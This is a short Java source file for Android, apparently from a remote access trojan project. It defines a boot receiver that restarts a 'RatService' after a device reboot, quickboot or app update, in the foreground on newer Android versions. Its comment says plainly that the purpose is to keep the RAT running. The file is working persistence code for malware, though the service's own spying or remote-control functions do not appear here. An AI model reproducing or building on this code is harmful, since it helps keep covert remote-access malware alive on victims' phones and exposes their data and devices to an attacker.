package com.darkbiit.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * Boot receiver: restarts the RAT service after a reboot.
 *
 * On Android 12+ a background start from a boot receiver is allowed for
 * BOOT_COMPLETED, but the foreground-service start is still required, which
 * RatService does.
 */
public class RatBootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent != null ? intent.getAction() : null;
        if (action == null) {
            return;
        }
        if (!Intent.ACTION_BOOT_COMPLETED.equals(action)
                && !"android.intent.action.QUICKBOOT_POWERON".equals(action)
                && !Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {
            return;
        }

        try {
            Intent svc = new Intent(context, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svc);
            } else {
                context.startService(svc);
            }
            RatLog.i("service started from " + action);
        } catch (Throwable t) {
            RatLog.w("boot start failed: " + t.getMessage());
        }
    }
}
